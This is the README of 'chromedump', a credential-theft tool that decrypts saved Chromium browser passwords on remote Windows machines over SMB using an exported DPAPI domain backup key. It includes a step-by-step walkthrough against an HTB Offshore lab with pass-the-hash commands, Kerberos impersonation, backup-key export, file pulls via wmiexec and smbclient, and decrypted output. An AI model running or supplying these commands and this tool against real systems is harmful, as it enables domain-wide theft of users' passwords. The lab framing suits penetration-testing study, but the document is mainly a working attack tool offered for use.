# chromedump

A Python tool that extracts and decrypts saved credentials from Chromium-based browsers on remote Windows machines, over SMB, using the Windows DPAPI domain backup key (PVK). No shellcode, no agent, no interactive session on the target required.

## The problem

When a Chromium browser saves a password, it encrypts it with AES-256-GCM. The AES key is itself encrypted by Windows DPAPI and stored in a file called `Local State`. DPAPI encrypts that key using a per-user master key, and the master key is stored encrypted on disk under `AppData\Roaming\Microsoft\Protect\<SID>\`.

To recover plaintext credentials from a remote machine, you need to break through that encryption chain from the outside.

There are two ways to do it.

---

### Method 1: LSASS (sekurlsa::dpapi)

When a user logs on interactively (type 2 logon, console or RDP), Windows decrypts and caches the master key in LSASS memory for the duration of the session. Mimikatz can extract it directly:

```
mimikatz # sekurlsa::dpapi
```

This gives you the raw master key bytes without touching the disk encryption at all. The limitation is that it requires a live interactive session and LSASS access, which means either a local admin shell on a machine where the target user is currently logged in, or a memory dump from one.

---

### Method 2: Domain backup key (this tool)

Every master key file on disk contains two encrypted copies of the master key:

* **MasterKey section**: encrypted symmetrically using a key derived from the user's logon password. Requires the current password. Breaks if the password has changed since the master key was created.
* **DomainKey section**: encrypted asymmetrically using an RSA-2048 public key belonging to the domain. This section can always be decrypted offline with the corresponding private key, regardless of the user's password, regardless of whether the user is logged in.

The RSA private key (the domain backup key) lives exclusively in the DC's LSA secrets and is never distributed. When a domain user's master key is first created, the DC encrypts it with this public key and writes the result into the `DomainKey` section. The idea is that if a user forgets their password, the domain can still recover their data.

With Domain Admin access, you can export that private key. Once you have it, you can decrypt any domain user's master key offline over SMB, without touching LSASS and without needing the user's password or an active session.

---

## Workflow

```
Domain Controller
      |
      | dpapi.py backupkeys --export
      v
  [PVK file]  <-- RSA-2048 private key, decrypts any domain user's master key
      |
      |  RSA-PKCS1v1.5 decrypt of DomainKey section
      v
  [Raw master key bytes]
      |
      |  DPAPI_BLOB.decrypt(masterkey)  via impacket
      v
  [Chrome AES-256 key]  <-- unwrapped from Local State
      |
      |  AES-256-GCM decrypt per row
      |  nonce = enc[3:15],  ciphertext = enc[15:]  (v10 prefix, Chrome 80+)
      v
  [Plaintext passwords]

Target machine (SMB)
      |
      +-- C$\Users\<user>\AppData\Roaming\Microsoft\Protect\<SID>\<GUID>  (master key file)
      +-- C$\Users\<user>\AppData\Local\Google\Chrome\User Data\Local State
      +-- C$\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Login Data
```

The DPAPI blob inside `Local State` embeds the GUID of the master key it was encrypted with. The tool reads that GUID and looks up the matching master key file by name, so there is no brute-forcing.

---

## Why not the existing tools

* **SharpChrome /rpc** contacts the DC at runtime via MS-BKRP to decrypt master keys. This requires a forwardable Kerberos ticket, which is often not available on the path from a compromised workstation.
* **SharpChrome /ntlm** derives the master key from the current NT hash. Only works if the password has not changed since the master key was created.
* **dploot** automates this full chain but crashes with `KeyError: 'profiles_order'` on old Chrome installations (pre-87, common on Windows 7) because the `Local State` JSON structure differs in older versions.
* **Manual approach** requires copying `Login Data` and `Local State` to a writable path first because tools like `smbclient.py` cannot handle paths with spaces, and the `Protect` directory is hidden so it requires `/a` to list. Doing this across multiple profiles is slow.

This tool handles all of those cases.

---

## Full engagement walkthrough

This is the full chain as performed against a real target (HTB Offshore prolab, WS03 / DC02).

### 1. Export the domain backup key from DC02

The domain backup key is an RSA private key held exclusively by domain controllers. With DA access to DC02 you can export it. It can decrypt any user's master key in the domain.

First get a Kerberos ticket for DC02:

```bash
getST.py -spn 'cifs/DC02.dev.ADMIN.OFFSHORE.COM' \
    -impersonate Administrator \
    -dc-ip 172.16.2.6 \
    -hashes :5cf7b4d94646e8efba50f45b88c12608 \
    'dev.ADMIN.OFFSHORE.COM/WS03$'
```

Export the ticket and pull the backup key:

```bash
export KRB5CCNAME=Administrator@cifs_DC02.dev.ADMIN.OFFSHORE.COM@DEV.ADMIN.OFFSHORE.COM.ccache

dpapi.py backupkeys --export \
    -t 'Administrator@DC02.dev.ADMIN.OFFSHORE.COM' \
    -k -no-pass \
    -dc-ip 172.16.2.6
```

```
[*] Exporting domain backupkey to file G$BCKUPKEY_99B2981E-C165-4003-B9E0-6EB6C210BC4D.pvk
```

Why this key lives only on the DC: when the domain was set up, the DC generated an RSA-2048 key pair. The public key is cached as a `BK-<DOMAIN>` file in each user's `Protect` directory and is used to encrypt the `DomainKey` section of every master key file. The private key never leaves the DC's LSA. Without owning a DC, this file is inaccessible.

---

### 2. Identify the master key

Running mimikatz against joe's Chrome `Login Data` fails to decrypt but reveals the exact master key GUID needed:

```
mimikatz # dpapi::chrome /in:"C:\Users\joe\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect

URL     : http://inventory.dev.admin.offshore.com/
Username: flag
ERROR kuhl_m_dpapi_chrome_decrypt ; {508a53ce-7406-4e75-8db3-6e4b8ebe6da3}
```

The GUID in the error message is the name of the master key file on disk. That file lives at:

```
C:\Users\joe\AppData\Roaming\Microsoft\Protect\S-1-5-21-1416445593-394318334-2645530166-1604\508a53ce-7406-4e75-8db3-6e4b8ebe6da3
```

---

### 3. Pull the files from WS03 via SMB

Three files are needed. The `Protect` directory is hidden so enumerate it with the wildcard pattern that impacket uses internally. The Chrome paths contain spaces so copy them to `C:\Windows\Temp` first via wmiexec before downloading:

```bash
wmiexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 joe@172.16.2.102 \
    'copy "C:\Users\joe\AppData\Local\Google\Chrome\User Data\Default\Login Data" C:\Windows\Temp\LoginData && copy "C:\Users\joe\AppData\Local\Google\Chrome\User Data\Local State" C:\Windows\Temp\LocalState'
```

Then pull via smbclient.py:

```bash
smbclient.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 joe@172.16.2.102
```

```
# use C$
# get Windows\Temp\LoginData
# get Windows\Temp\LocalState
# get Users\joe\AppData\Roaming\Microsoft\Protect\S-1-5-21-1416445593-394318334-2645530166-1604\508a53ce-7406-4e75-8db3-6e4b8ebe6da3
```

---

### 4. Decrypt the master key

```bash
pvk=$(ls *.pvk)
dpapi.py masterkey \
    -file 508a53ce-7406-4e75-8db3-6e4b8ebe6da3 \
    -pvk "$pvk"
```

```
[MASTERKEYFILE]
Guid        : {508a53ce-7406-4e75-8db3-6e4b8ebe6da3}
MasterKeyLen: 00000088 (136)
DomainKeyLen: 00000174 (372)

Decrypted key with domain backup key
Decrypted key: 0x940b868de2131d684f68546efeb0f5745bfbfeac2c4694bde5bfd8e2a41c85a70e07503c34f5ffe99149e32b341737f3601a2314b3ca7c61504edf85e244aeb2
```

What happened internally: the master key file's `DomainKey` section holds the 64-byte master key encrypted with the DC's RSA public key. `dpapi.py` uses the PVK to RSA-PKCS1v1.5-decrypt that section and returns the raw master key bytes.

---

### 5. Decrypt Chrome credentials

With the domain backup key and SMB access, chromedump handles steps 3 and 4 automatically across all users and browsers:

```bash
python3 chromedump.py \
    -t 172.16.2.102 \
    -d DEV \
    -u joe \
    -H :31d6cfe0d16ae931b73c59d7e0c089c0 \
    --pvk 'G$BCKUPKEY_99B2981E-C165-4003-B9E0-6EB6C210BC4D.pvk'
```

```
[*] Connecting to 172.16.2.102
[+] Authenticated as DEV\joe
[*] Loading PVK: G$BCKUPKEY_99B2981E-C165-4003-B9E0-6EB6C210BC4D.pvk
[+] Backup key loaded (2048-bit RSA)
[*] User profiles: ['Administrator', 'joe', 'Public']
  [+] joe/S-1-5-21-.../508a53ce-7406-4e75-8db3-6e4b8ebe6da3 -> 940b868de2131d68...
[*] Decrypted 1 master key(s)
  [*] joe/Chrome: AES key 7f06d8484a167001...
    [+] Default: 1 credential(s)

Profile      Browser    Sub-profile  URL                                            Username             Password
joe          Chrome     Default      http://inventory.dev.admin.offshore.com/       flag                 OFFSHORE{d0nt_s@ve_p@ssw0rds_1n_br0ws3rs!}
```

---

## Installation

```bash
pip install -r requirements.txt
```

## Usage

```
python3 chromedump.py -t TARGET -u USERNAME --pvk BACKUP_KEY.pvk [options]

required:
  -t, --target      Target IP or hostname
  -u, --username    SMB username
  --pvk             Path to the domain backup key PVK file

authentication:
  -p, --password    Cleartext password
  -H, --hashes      :NTHASH or LMHASH:NTHASH

optional:
  -d, --domain      Windows domain name
```

## Supported browsers

* Google Chrome
* Microsoft Edge
* Brave
* Chromium
* Opera

## Caveats

* If the `DomainKey` section is absent from a master key file, the tool reports `no DomainKey (local-only)` and skips it. This can happen on machines that were not domain-joined when the profile was first created.
* If Chrome is running on the target during a live engagement, `Login Data` may be locked. Either kill the browser first or copy it to a temp path manually.
* The `Protect` directory is hidden. The tool uses impacket's `listPath` with a wildcard which retrieves hidden files automatically, no workaround needed.
* Quote the PVK filename in the shell if it contains a `$` character (the exported filename always does): `--pvk 'G$BCKUPKEY_....pvk'`

## References

* MS-DPAPI specification: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dpapi
* MS-BKRP BackupKey Remote Protocol: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-bkrp
* impacket DPAPI module: https://github.com/fortra/impacket/blob/master/impacket/dpapi.py
